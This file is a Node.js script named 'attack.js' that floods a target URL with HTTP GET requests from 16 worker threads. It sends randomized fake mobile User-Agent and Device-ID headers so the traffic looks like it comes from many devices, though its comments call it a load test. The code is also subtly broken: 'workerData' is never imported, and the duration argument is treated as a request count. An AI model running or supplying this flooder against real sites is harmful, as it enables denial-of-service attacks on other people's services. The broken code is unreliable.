const http = require('http');
const { Worker, isMainThread, parentPort } = require('worker_threads');
const faker = require('faker'); // For random UA and device ID generation
const uuid = require('uuid'); // For generating unique device IDs
const os = require('os');

// Generate Random Mobile User-Agent (UA)
function generateRandomUA() {
  const mobileBrands = ['Apple', 'Samsung', 'Huawei', 'Google', 'Xiaomi'];
  const devices = ['iPhone', 'Galaxy', 'Pixel', 'Mate', 'Redmi'];
  const osVersions = ['14.4', '10.0', '11', '9', '13'];
  const randomBrand = mobileBrands[Math.floor(Math.random() * mobileBrands.length)];
  const randomDevice = devices[Math.floor(Math.random() * devices.length)];
  const randomOSVersion = osVersions[Math.floor(Math.random() * osVersions.length)];
  
  return `${randomBrand} ${randomDevice} ${randomOSVersion}`;
}

// Generate Random Device ID (Android or iOS format)
function generateRandomDeviceID() {
  const isAndroid = Math.random() < 0.5; // Randomly decide if it's Android or iOS
  return isAndroid ? uuid.v4().replace(/-/g, '') : faker.datatype.uuid().replace(/-/g, '');
}

// HTTP Request Function to send requests
function sendRequest(targetUrl) {
  const options = {
    hostname: targetUrl.hostname,
    port: 80, // Assuming HTTP/1.1, default port for HTTP
    path: targetUrl.pathname,
    method: 'GET',
    headers: {
      'User-Agent': generateRandomUA(),
      'Device-ID': generateRandomDeviceID(),
      'Connection': 'keep-alive',
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Encoding': 'gzip, deflate, br',
      'Accept-Language': 'en-US,en;q=0.5',
    }
  };

  const req = http.request(options, (res) => {
    res.on('data', () => {}); // We discard the data since we're focused on the requests
    res.on('end', () => {}); // Do nothing after the request ends
  });

  req.on('error', (err) => {
    console.error(`Error: ${err.message}`);
  });

  req.end();
}

// Worker function to send requests in parallel
function workerFunction(targetUrl, requests) {
  for (let i = 0; i < requests; i++) {
    sendRequest(targetUrl);
  }
}

// Main function for managing threads
function startLoadTest(targetUrl, duration) {
  const numThreads = 16; // Number of threads for load generation
  const requestsPerThread = Math.floor(duration / numThreads); // Divide requests equally across threads

  // Create workers
  for (let i = 0; i < numThreads; i++) {
    new Worker(__filename, {
      workerData: { targetUrl: targetUrl, requests: requestsPerThread },
    });
  }
}

// If the current thread is the main thread, handle arguments and run the load test
if (isMainThread) {
  const args = process.argv.slice(2);
  const targetUrl = new URL(args[0]); // First argument is the target URL
  const duration = parseInt(args[1], 10); // Second argument is the duration (in ms)

  if (!targetUrl || !duration) {
    console.error('Usage: node attack.js <target_url> <duration_in_ms>');
    process.exit(1);
  }

  // Start the load test
  startLoadTest(targetUrl, duration);
} else {
  // Worker thread logic
  const { targetUrl, requests } = workerData;
  workerFunction(targetUrl, requests);
}
